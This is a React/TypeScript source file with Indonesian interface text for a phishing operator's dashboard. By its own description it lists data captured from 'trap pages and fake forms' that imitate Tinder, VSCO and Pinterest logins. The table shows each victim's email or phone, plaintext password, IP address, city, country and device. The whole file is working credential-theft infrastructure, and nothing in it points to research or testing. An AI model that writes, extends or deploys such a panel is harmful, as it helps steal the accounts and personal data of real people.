'use client';

import { Badge } from '@/components/ui/badge';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { formatDate } from '@/lib/utils';
import { Eye, Facebook, Mail, Phone, Shield } from 'lucide-react';
import { useEffect, useState } from 'react';

interface FormCaptureData {
  id: string;
  source: string;
  email: string | null;
  password: string | null;
  name: string | null;
  phone: string | null;
  additional_data: any;
  ip: string | null;
  country: string | null;
  city: string | null;
  browser: string | null;
  device: string | null;
  os: string | null;
  created_at: bigint | null;
}

export function FormCapturesView() {
  const [formCaptures, setFormCaptures] = useState<FormCaptureData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    async function fetchFormCaptures() {
      try {
        const response = await fetch('/api/dashboard/form-captures');

        if (!response.ok) {
          throw new Error('Failed to fetch form captures');
        }

        const data = await response.json();
        setFormCaptures(data.data || []);
      } catch (err) {
        console.error('Error fetching form captures:', err);
        setError('Failed to load form captures data');
      } finally {
        setIsLoading(false);
      }
    }

    fetchFormCaptures();
  }, []);

  // Helper function untuk mendapatkan warna badge berdasarkan source
  const getSourceColor = (source: string) => {
    switch (source.toLowerCase()) {
      case 'tinder':
        return 'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300';
      case 'vsco':
        return 'bg-purple-100 text-purple-800 dark:bg-purple-900 dark:text-purple-300';
      case 'pinterest':
        return 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300';
      default:
        return 'bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-300';
    }
  };

  // Helper function untuk mendapatkan ikon berdasarkan source
  const getSourceIcon = (source: string) => {
    switch (source.toLowerCase()) {
      case 'tinder':
        return <Eye className='h-4 w-4 text-red-600' />;
      case 'vsco':
        return <Facebook className='h-4 w-4 text-purple-600' />;
      case 'pinterest':
        return <Facebook className='h-4 w-4 text-yellow-600' />;
      default:
        return <Facebook className='h-4 w-4 text-gray-600' />;
    }
  };

  // Filter form captures berdasarkan source
  const tinderCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'tinder',
  );
  const vscoCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'vsco',
  );
  const otherCaptures = formCaptures.filter(
    (capture) => !['tinder', 'vsco'].includes(capture.source.toLowerCase()),
  );

  if (isLoading) {
    return (
      <div className='flex h-96 items-center justify-center'>
        <div className='text-center'>
          <svg
            className='mx-auto h-10 w-10 animate-spin text-primary'
            xmlns='http://www.w3.org/2000/svg'
            fill='none'
            viewBox='0 0 24 24'
          >
            <circle
              className='opacity-25'
              cx='12'
              cy='12'
              r='10'
              stroke='currentColor'
              strokeWidth='4'
            ></circle>
            <path
              className='opacity-75'
              fill='currentColor'
              d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'
            ></path>
          </svg>
          <p className='mt-4 text-sm text-muted-foreground'>
            Memuat data form captures...
          </p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className='flex h-96 items-center justify-center'>
        <div className='text-center'>
          <div className='mx-auto flex h-10 w-10 items-center justify-center rounded-full bg-red-100 text-red-500'>
            <svg
              xmlns='http://www.w3.org/2000/svg'
              fill='none'
              viewBox='0 0 24 24'
              stroke='currentColor'
              className='h-6 w-6'
            >
              <path
                strokeLinecap='round'
                strokeLinejoin='round'
                strokeWidth={2}
                d='M6 18L18 6M6 6l12 12'
              />
            </svg>
          </div>
          <p className='mt-4 text-sm text-muted-foreground'>{error}</p>
        </div>
      </div>
    );
  }

  return (
    <div className='space-y-6'>
      <div className='flex flex-col justify-between gap-4 md:flex-row md:items-center'>
        <div>
          <h1 className='text-2xl font-bold tracking-tight'>
            Form Captures Data
          </h1>
          <p className='text-muted-foreground'>
            Data yang berhasil ditangkap dari halaman trap dan form palsu
          </p>
        </div>
      </div>

      <Tabs defaultValue='all' className='space-y-4'>
        <TabsList>
          <TabsTrigger value='all'>Semua ({formCaptures.length})</TabsTrigger>
          <TabsTrigger value='tinder'>
            Tinder ({tinderCaptures.length})
          </TabsTrigger>
          <TabsTrigger value='vsco'>VSCO ({vscoCaptures.length})</TabsTrigger>
          <TabsTrigger value='other'>
            Lainnya ({otherCaptures.length})
          </TabsTrigger>
        </TabsList>

        <TabsContent value='all' className='space-y-4'>
          <FormCaptureTable
            formCaptures={formCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='tinder' className='space-y-4'>
          <FormCaptureTable
            formCaptures={tinderCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='vsco' className='space-y-4'>
          <FormCaptureTable
            formCaptures={vscoCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='other' className='space-y-4'>
          <FormCaptureTable
            formCaptures={otherCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>
      </Tabs>
    </div>
  );
}

interface FormCaptureTableProps {
  formCaptures: FormCaptureData[];
  getSourceColor: (source: string) => string;
  getSourceIcon: (source: string) => JSX.Element;
}

function FormCaptureTable({
  formCaptures,
  getSourceColor,
  getSourceIcon,
}: FormCaptureTableProps) {
  if (formCaptures.length === 0) {
    return (
      <Card>
        <CardHeader>
          <CardTitle>Tidak Ada Data</CardTitle>
          <CardDescription>
            Belum ada data form yang ditangkap untuk kategori ini
          </CardDescription>
        </CardHeader>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Data Form Captures</CardTitle>
        <CardDescription>
          Informasi yang berhasil dikumpulkan dari halaman palsu
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className='overflow-x-auto'>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Waktu</TableHead>
                <TableHead>Sumber</TableHead>
                <TableHead>Email/Telepon</TableHead>
                <TableHead>Password</TableHead>
                <TableHead>IP/Lokasi</TableHead>
                <TableHead>Perangkat</TableHead>
                <TableHead>Data Tambahan</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {formCaptures.map((capture) => (
                <TableRow key={capture.id}>
                  <TableCell className='whitespace-nowrap'>
                    {capture.created_at
                      ? formatDate(capture.created_at.toString())
                      : 'N/A'}
                  </TableCell>
                  <TableCell>
                    <Badge
                      className={getSourceColor(capture.source)}
                      variant='outline'
                    >
                      <span className='flex items-center gap-1'>
                        {getSourceIcon(capture.source)}
                        <span>{capture.source}</span>
                      </span>
                    </Badge>
                  </TableCell>
                  <TableCell>
                    {capture.email && (
                      <div className='flex items-center gap-1'>
                        <Mail className='h-4 w-4 text-blue-600' />
                        <span className='text-sm'>{capture.email}</span>
                      </div>
                    )}
                    {capture.phone && (
                      <div className='mt-1 flex items-center gap-1'>
                        <Phone className='h-4 w-4 text-green-600' />
                        <span className='text-sm'>{capture.phone}</span>
                      </div>
                    )}
                    {!capture.email && !capture.phone && (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    {capture.password ? (
                      <div className='flex items-center gap-1'>
                        <Shield className='h-4 w-4 text-red-600' />
                        <span className='font-mono text-sm'>
                          {capture.password}
                        </span>
                      </div>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                  <TableCell>
                    <div className='text-sm'>
                      <div>{capture.ip || 'N/A'}</div>
                      {capture.country && (
                        <div className='text-xs text-muted-foreground'>
                          {capture.city ? `${capture.city}, ` : ''}
                          {capture.country}
                        </div>
                      )}
                    </div>
                  </TableCell>
                  <TableCell>
                    <div className='text-sm'>
                      <div>{capture.device || 'N/A'}</div>
                      {(capture.browser || capture.os) && (
                        <div className='text-xs text-muted-foreground'>
                          {capture.browser}{' '}
                          {capture.os ? `/ ${capture.os}` : ''}
                        </div>
                      )}
                    </div>
                  </TableCell>
                  <TableCell>
                    {capture.additional_data ? (
                      <pre className='max-h-24 max-w-xs overflow-auto rounded bg-muted p-1 text-xs'>
                        {JSON.stringify(capture.additional_data, null, 2)}
                      </pre>
                    ) : (
                      <span className='text-sm text-muted-foreground'>N/A</span>
                    )}
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </CardContent>
    </Card>
  );
}
